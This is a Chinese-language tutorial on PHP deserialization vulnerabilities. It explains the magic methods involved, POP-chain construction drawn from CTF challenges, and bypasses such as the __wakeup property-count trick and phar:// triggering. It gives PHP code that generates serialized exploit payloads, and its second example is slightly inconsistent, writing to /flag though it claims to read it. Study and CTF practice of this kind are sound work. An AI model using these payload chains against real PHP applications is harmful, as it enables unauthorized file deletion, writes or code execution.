一、漏洞原理与触发逻辑

反序列化漏洞的本质是通过unserialize()函数解析用户可控的序列化数据，触发对象中的魔术方法（如__destruct()、__wakeup()等），从而执行恶意操作。例如：

​ 文件删除：若__destruct()中调用unlink($this->filename)，攻击者可通过控制filename属性删除系统文件。

​代码执行：若__toString()或__invoke()中调用eval()或system()，可通过构造对象链触发命令执行。

常用魔术方法:

__wakeup() //执行unserialize()时，先会调用这个函数

__sleep() //执行serialize()时，先会调用这个函数

__destruct() //对象被销毁时触发

__call() //在对象上下文中调用不可访问的方法时触发

__callStatic() //在静态上下文中调用不可访问的方法时触发

__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法

__set() //用于将数据写入不可访问的属性

__isset() //在不可访问的属性上调用isset()或empty()触发

__unset() //在不可访问的属性上使用unset()时触发

__toString() //把对象当作字符串使用时触发

__invoke() //当尝试将对象调用为函数时触发

二、典型POP链构造步骤（以CTF赛题为例）

​起点选择

通常从__destruct()或__wakeup()开始。例如：

php
class Start {
public $mod1;
public function __destruct() {
$this->mod1->test1(); // 触发下一层方法调用
}
}

​方法串联

通过属性传递对象链，逐步触发魔术方法：

​Call::test1() 调用不存在的test2()，触发Funct::__call()。

​Funct::__call() 将$mod1作为函数调用，触发Func::__invoke()。

​Func::__invoke() 拼接字符串，触发String1::__toString()。

​String1::__toString() 调用GetFlag::get_flag()获取Flag

最终利用

通过动态调用链实现代码执行或敏感操作：

构造Payload示例

$start = new Start();
$start->mod1 = new Call();
$start->mod1->mod1 = new Funct();
$start->mod1->mod1->mod1 = new Func();
$start->mod1->mod1->mod1->mod1 = new String1();
$start->mod1->mod1->mod1->mod1->str1 = new GetFlag();
echo serialize($start);

三、绕过技巧与防御对抗

​绕过__wakeup()

修改序列化字符串中的属性数量（如O:1:”A”:2改为O:1:”A”:3），跳过__wakeup()执行。

​Phar协议利用

通过phar://协议触发反序列化，无需直接调用unserialize()

​构造Phar文件：伪装为图片或其他格式绕过上传限制。

​触发条件：调用file_exists()或file_get_contents()等函数。

​属性类型混淆

在PHP 7.1+中，protected/private属性的序列化前缀（\x00*）可省略，直接构造无前缀的序列化字符串实现利用。

题目示例

某CTF题目中，反序列化入口为unserialize($_GET[‘data’])，要求通过POP链获取/flag文件内容。

解题思路

​分析类结构

识别包含魔术方法的类（如FileHandler、Logger），寻找可串联的方法调用路径。

​构造POP链

​起点：FileHandler::__destruct()调用$this->log->save()。

​中间层：Logger::save()触发$this->writer->write()。

​终点：Writer::write()调用file_put_contents($this->path, $this->content)。

​Payload生成

php
class FileHandler {
public $log;
public function __construct() {
$this->log = new Logger();
}
}
class Logger {
public $writer;
public function __construct() {
$this->writer = new Writer();
}
}
class Writer {
public $path = ‘/flag’;
public $content = ‘‘;
}
echo urlencode(serialize(new FileHandler()));
